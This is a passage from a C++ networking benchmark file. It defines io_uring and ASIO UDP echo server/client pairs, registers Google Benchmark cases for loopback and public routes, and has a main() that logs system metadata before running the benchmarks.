        //          io_uring_submit_and_wait(&ring_, 1);
        //      }

        result.batch_latency = std::chrono::steady_clock::now() - batch_start_time;
        return result;
    }
};

static void rpc_uring60(bm::State &state, networking_route_t route, std::size_t batch_size, std::size_t packet_size) {
    auto [major, minor] = fetch_linux_kernel_version();
    if (major < 6) {
        std::string message = "Kernel version "s + std::to_string(major) + "."s + std::to_string(minor) +
                              " too old for io_uring 6.0 variant"s;
        state.SkipWithError(message.c_str());
        return;
    }
    return rpc<rpc_uring60_server, rpc_uring60_client>(state, route, batch_size, packet_size);
}

BENCHMARK_CAPTURE(rpc_uring60, loopback, networking_route_t::loopback_k, 256 /* messages per batch */,
                  1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()
    ->Unit(benchmark::kMicrosecond);

BENCHMARK_CAPTURE(rpc_uring60, public, networking_route_t::public_k, 256 /* messages per batch */,
                  1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()
    ->Unit(benchmark::kMicrosecond);

#endif            // Is Linux 6.0 or higher
#endif            // Is Linux
#pragma endregion // IO Uring

#pragma region ASIO
#include <asio.hpp>

class rpc_asio_server {

    asio::io_context context_;
    asio::ip::udp::socket socket_;
    std::thread context_thread_;

    /// @brief Buffers, one per concurrent request
    std::vector<rpc_buffer_t> buffers_;
    /// @brief Where did the packets come from
    std::vector<asio::ip::udp::endpoint> clients_;
    /// @brief Which buffers are available?
    std::vector<std::size_t> buffers_available_;
    /// @brief Flag to stop the server without corrupting the state
    std::atomic_bool should_stop_;
    // Use a work guard so the io_context doesn’t run out of work and exit.
    asio::executor_work_guard<asio::io_context::executor_type> work_guard_;

    std::size_t failed_receptions_ = 0;
    std::size_t failed_responses_ = 0;

  public:
    rpc_asio_server(std::string const &address, std::uint16_t port, std::size_t max_concurrency)
        : context_(), socket_(context_), buffers_(max_concurrency), clients_(max_concurrency),
          work_guard_(asio::make_work_guard(context_)) {
        // Use your helper function to create and bind the native socket.
        auto server = rpc_server_socket(port, address);
        // Now assign the native socket to the ASIO socket.
        socket_.assign(asio::ip::udp::v4(), server.socket_descriptor);
    }

    void stop() { should_stop_.store(true, std::memory_order_seq_cst); }
    void close() {
        socket_.cancel();
        context_.stop();
        if (context_thread_.joinable()) context_thread_.join();
    }

    void operator()() {
        // For per-operation cancellations we could use the `asio::cancellation_signal`.
        // Let's issue a receive operation for each buffer, which will call a chain of
        // operations to process the packet and send a response, and repeat again.
        for (std::size_t job = 0; job < buffers_.size(); ++job) reuse_buffer(job);
        // Start listening for incoming packets.
        context_thread_ = std::thread([this] { context_.run(); });
    }

  private:
    void reuse_buffer(std::size_t job) {
        auto finalize = [this, job](std::error_code error, std::size_t) {
            if (error) failed_responses_++;
            if (should_stop_.load(std::memory_order_seq_cst)) return;
            reuse_buffer(job);
        };
        auto respond = [this, finalize, job](std::error_code error, std::size_t bytes) {
            if (error) { reuse_buffer(job); }
            else { socket_.async_send_to(asio::buffer(buffers_[job], bytes), clients_[job], finalize); }
        };
        socket_.async_receive_from(asio::buffer(buffers_[job]), clients_[job], respond);
    }
};

class rpc_asio_client {

    asio::io_context context_;
    asio::ip::udp::socket socket_;
    asio::ip::udp::endpoint server_;
    std::thread context_thread_;

    /// @brief Buffers, one per concurrent request
    std::vector<rpc_buffer_t> buffers_;
    /// @brief Track the send timestamps for each slot to measure latency
    std::vector<std::chrono::steady_clock::time_point> send_times_;
    // Work guard to keep the io_context running.
    asio::executor_work_guard<asio::io_context::executor_type> work_guard_;

  public:
    rpc_asio_client(std::string const &server_addr, std::uint16_t port, std::size_t concurrency)
        : context_(), socket_(context_), buffers_(concurrency), send_times_(concurrency),
          work_guard_(asio::make_work_guard(context_)) {

        // Use the helper function to create the native client socket.
        auto client = rpc_client_socket(server_addr, port);
        // Assign the native socket to the ASIO socket.
        socket_.assign(asio::ip::udp::v4(), client.socket_descriptor);
        // Convert the native `sockaddr_in` from our `rpc_client_socket` to an ASIO endpoint.
        server_ = asio::ip::udp::endpoint(                                      //
            asio::ip::address_v4(ntohl(client.server_address.sin_addr.s_addr)), //
            ntohs(client.server_address.sin_port));
        // Start listening for incoming packets.
        context_thread_ = std::thread([this] { context_.run(); });

        // Fill each buffer with some pattern (just 'X's, for example)
        for (auto &buf : buffers_) buf.fill('X');
    }

    ~rpc_asio_client() {
        socket_.cancel();
        context_.stop();
        if (context_thread_.joinable()) context_thread_.join();
    }

    rpc_batch_result operator()() { return one_batch(); }

  private:
    rpc_batch_result one_batch() {
        rpc_batch_result result;

        // For per-operation cancellations we could use the `asio::cancellation_signal`,
        // but this is the simple lucky case when we only want to cancel all the outstanding
        // transfers at once.
        std::atomic<std::size_t> remaining = 0;
        for (std::size_t job = 0; job < buffers_.size(); ++job, ++remaining) {
            send_times_[job] = std::chrono::steady_clock::now();
            auto finalize = [this, job, &result, &remaining](std::error_code error, std::size_t) {
                remaining--;
                if (error) return;

                // Measure latency
                auto response_time = std::chrono::steady_clock::now();
                auto diff = response_time - send_times_[job];
                result.batch_latency += diff;
                result.max_packet_latency = std::max(result.max_packet_latency, diff);
                result.received_packets++;
            };
            auto receive = [this, job, finalize, &remaining](std::error_code error, std::size_t bytes) {
                if (error) { remaining--; }
                else { socket_.async_receive_from(asio::buffer(buffers_[job], bytes), server_, finalize); }
            };
            socket_.async_send_to(asio::buffer(buffers_[job]), server_, receive);
            result.sent_packets++;
        }

        std::chrono::steady_clock::time_point expiry = std::chrono::steady_clock::now() + rpc_batch_timeout_k;
        asio::steady_timer timer(context_, expiry);
        timer.wait();
        if (remaining) socket_.cancel(); // Forcibly abort all ops on this socket
        return result;
    }
};

static void rpc_asio(bm::State &state, networking_route_t route, std::size_t batch_size, std::size_t packet_size) {
    return rpc<rpc_asio_server, rpc_asio_client>(state, route, batch_size, packet_size);
}

BENCHMARK_CAPTURE(rpc_asio, loopback, networking_route_t::loopback_k, 256 /* messages per batch */,
                  1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()
    ->Unit(benchmark::kMicrosecond);

BENCHMARK_CAPTURE(rpc_asio, public, networking_route_t::public_k, 256 /* messages per batch */,
                  1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()
    ->Unit(benchmark::kMicrosecond);

#pragma endregion // ASIO

#pragma endregion // - Networking and Databases

/**
 *  The default variant is to invoke the `BENCHMARK_MAIN()` macro.
 *  Alternatively, we can unpack it, if we want to augment the main function
 *  with more system logging logic or pre-process some datasets before running.
 */

int main(int argc, char **argv) {

    // Let's log the CPU specs:
    std::size_t const cache_line_width = fetch_cache_line_width();
    std::string const public_ip = fetch_public_ip();
    std::printf("Cache line width: %zu bytes\n", cache_line_width);
    std::printf("Public IP address: %s\n", public_ip.c_str());

// On Linux we can print more metadata:
#if defined(__linux__)
    auto [major, minor] = fetch_linux_kernel_version();
    std::printf("Linux kernel version: %d.%d\n", major, minor);
#endif

    // Make sure the defaults are set correctly:
    char arg0_default[] = "benchmark";
    char *args_default = arg0_default;
    if (!argv) argc = 1, argv = &args_default;
    bm::Initialize(&argc, argv);
    if (bm::ReportUnrecognizedArguments(argc, argv)) return 1;
    bm::RunSpecifiedBenchmarks();
    bm::Shutdown();
    return 0;
}
